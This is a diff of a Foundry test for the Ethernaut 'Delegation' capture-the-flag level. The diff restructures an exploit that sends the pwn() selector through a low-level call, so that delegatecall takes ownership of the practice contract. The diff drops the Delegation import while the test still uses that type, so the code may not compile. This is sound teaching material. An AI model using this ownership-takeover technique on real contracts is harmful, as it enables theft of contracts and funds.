@@ -1,7 +1,6 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../Delegation/Delegation.sol";
 import "../Delegation/DelegationFactory.sol";
 import "../Ethernaut.sol";
 
@@ -15,31 +14,26 @@ interface CheatCodes {
 contract DelegationTest is DSTest {
     CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
-    DelegationFactory delegationFactory;
-    address levelAddress;
-    bool levelSuccessfullyPassed;
 
     function setUp() public {
-        // Setup instances of the Ethernaut & DelegationFactory contracts
+        // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
-        delegationFactory = new DelegationFactory();
     }
 
     function testDelegationHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
 
-        // Register the Ethernaut Delegation level (this would have already been done on Rinkeby)
+        DelegationFactory delegationFactory = new DelegationFactory();
         ethernaut.registerLevel(delegationFactory);
-
-        // Add some ETH to the 0 address which we will be using 
-        payable(address(0)).transfer(1 ether);
-        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
-        cheats.startPrank(address(0));
-
-        // Set up the Level
-        levelAddress = ethernaut.createLevelInstance(delegationFactory);
-
-        // Cast the level address to the Delegation contract class
+        cheats.startPrank(tx.origin);
+        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
         Delegation ethernautDelegation = Delegation(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
 
         // Determine method hash, required for function call
         bytes4 methodHash = bytes4(keccak256("pwn()"));
@@ -47,13 +41,13 @@ contract DelegationTest is DSTest {
         // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
         address(ethernautDelegation).call(abi.encode(methodHash));
 
-        // Submit level to the core Ethernaut contract
-        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
 
-        // Stop the prank - calls with no longer come from address(0) 
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         cheats.stopPrank();
-
-        // Verify the level has passed
         assert(levelSuccessfullyPassed);
     }
 }
